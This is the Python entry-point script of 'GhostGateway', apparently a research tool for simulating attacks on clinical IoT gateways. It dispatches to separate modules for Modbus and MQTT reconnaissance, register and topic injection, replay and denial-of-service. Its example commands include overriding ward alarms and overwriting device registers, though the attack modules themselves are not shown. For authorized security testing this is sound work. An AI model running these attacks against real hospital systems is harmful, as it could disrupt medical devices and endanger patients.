#!/usr/bin/env python3
"""
GhostGateway - Clinical IoT Gateway Attack Simulator
Author: Security Research Tool
License: MIT
WARNING: For authorized testing and research only.
"""

import argparse
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from utils.banner import print_banner
from utils.logger import get_logger
from utils.report import ReportGenerator

logger = get_logger("GhostGateway")


def parse_args():
    parser = argparse.ArgumentParser(
        description="GhostGateway - Clinical IoT Gateway Attack Simulator",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  # Modbus recon
  python ghostgateway.py --protocol modbus --mode recon --target 192.168.1.10

  # MQTT recon
  python ghostgateway.py --protocol mqtt --mode recon --broker 192.168.1.20

  # Modbus injection
  python ghostgateway.py --protocol modbus --mode inject --target 192.168.1.10 --register 1 --value 999

  # MQTT injection
  python ghostgateway.py --protocol mqtt --mode inject --broker 192.168.1.20 --topic "ward/device/command" --payload "ALARM_OVERRIDE"

  # Modbus replay
  python ghostgateway.py --protocol modbus --mode replay --target 192.168.1.10

  # MQTT replay
  python ghostgateway.py --protocol mqtt --mode replay --broker 192.168.1.20 --topic "ward/vitals/#"

  # Modbus DoS
  python ghostgateway.py --protocol modbus --mode dos --target 192.168.1.10

  # MQTT DoS
  python ghostgateway.py --protocol mqtt --mode dos --broker 192.168.1.20

  # Full attack suite
  python ghostgateway.py --protocol all --mode full --target 192.168.1.10 --broker 192.168.1.20

  # Generate report after attack
  python ghostgateway.py --report --output reports/ghostgateway_report.html
        """
    )

    parser.add_argument("--protocol", choices=["modbus", "mqtt", "all"],
                        help="Target protocol")
    parser.add_argument("--mode", choices=["recon", "inject", "replay", "dos", "full"],
                        help="Attack mode")
    parser.add_argument("--target", default="127.0.0.1",
                        help="Modbus target IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=502,
                        help="Modbus port (default: 502)")
    parser.add_argument("--broker", default="127.0.0.1",
                        help="MQTT broker IP (default: 127.0.0.1)")
    parser.add_argument("--mqtt-port", type=int, default=1883,
                        help="MQTT port (default: 1883)")
    parser.add_argument("--topic", default="#",
                        help="MQTT topic (default: #)")
    parser.add_argument("--payload", default="GHOSTGATEWAY_TEST",
                        help="MQTT injection payload")
    parser.add_argument("--register", type=int, default=1,
                        help="Modbus register address for injection")
    parser.add_argument("--value", type=int, default=9999,
                        help="Value to write during Modbus injection")
    parser.add_argument("--unit-id", type=int, default=1,
                        help="Modbus unit/slave ID (default: 1)")
    parser.add_argument("--duration", type=int, default=10,
                        help="DoS attack duration in seconds (default: 10)")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of threads for DoS (default: 10)")
    parser.add_argument("--report", action="store_true",
                        help="Generate HTML report")
    parser.add_argument("--output", default="reports/ghostgateway_report.html",
                        help="Report output path")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Verbose output")

    return parser.parse_args()


def run_modbus(args, report_gen):
    from core.modbus.recon import ModbusRecon
    from core.modbus.injection import ModbusInjection
    from core.modbus.replay import ModbusReplay
    from core.modbus.dos import ModbusDoS

    results = {}

    if args.mode in ("recon", "full"):
        logger.info(f"[MODBUS] Starting Recon on {args.target}:{args.port}")
        recon = ModbusRecon(args.target, args.port, args.unit_id, args.verbose)
        results["modbus_recon"] = recon.run()

    if args.mode in ("inject", "full"):
        logger.info(f"[MODBUS] Starting Injection on {args.target}:{args.port}")
        inj = ModbusInjection(args.target, args.port, args.unit_id, args.verbose)
        results["modbus_injection"] = inj.run(args.register, args.value)

    if args.mode in ("replay", "full"):
        logger.info(f"[MODBUS] Starting Replay on {args.target}:{args.port}")
        rpl = ModbusReplay(args.target, args.port, args.unit_id, args.verbose)
        results["modbus_replay"] = rpl.run()

    if args.mode in ("dos", "full"):
        logger.info(f"[MODBUS] Starting DoS on {args.target}:{args.port}")
        dos = ModbusDoS(args.target, args.port, args.verbose)
        results["modbus_dos"] = dos.run(args.duration, args.threads)

    report_gen.add_results("Modbus", results)


def run_mqtt(args, report_gen):
    from core.mqtt.recon import MQTTRecon
    from core.mqtt.injection import MQTTInjection
    from core.mqtt.replay import MQTTReplay
    from core.mqtt.dos import MQTTDoS

    results = {}

    if args.mode in ("recon", "full"):
        logger.info(f"[MQTT] Starting Recon on {args.broker}:{args.mqtt_port}")
        recon = MQTTRecon(args.broker, args.mqtt_port, args.verbose)
        results["mqtt_recon"] = recon.run()

    if args.mode in ("inject", "full"):
        logger.info(f"[MQTT] Starting Injection on {args.broker}:{args.mqtt_port}")
        inj = MQTTInjection(args.broker, args.mqtt_port, args.verbose)
        results["mqtt_injection"] = inj.run(args.topic, args.payload)

    if args.mode in ("replay", "full"):
        logger.info(f"[MQTT] Starting Replay on {args.broker}:{args.mqtt_port}")
        rpl = MQTTReplay(args.broker, args.mqtt_port, args.verbose)
        results["mqtt_replay"] = rpl.run(args.topic)

    if args.mode in ("dos", "full"):
        logger.info(f"[MQTT] Starting DoS on {args.broker}:{args.mqtt_port}")
        dos = MQTTDoS(args.broker, args.mqtt_port, args.verbose)
        results["mqtt_dos"] = dos.run(args.duration, args.threads)

    report_gen.add_results("MQTT", results)


def main():
    print_banner()
    args = parse_args()

    if not args.protocol and not args.report:
        print("[!] No protocol specified. Use --help for usage.")
        sys.exit(1)

    report_gen = ReportGenerator()

    if args.protocol in ("modbus", "all"):
        run_modbus(args, report_gen)

    if args.protocol in ("mqtt", "all"):
        run_mqtt(args, report_gen)

    if args.report or args.mode == "full":
        os.makedirs(os.path.dirname(args.output), exist_ok=True)
        report_gen.generate(args.output)
        logger.info(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()
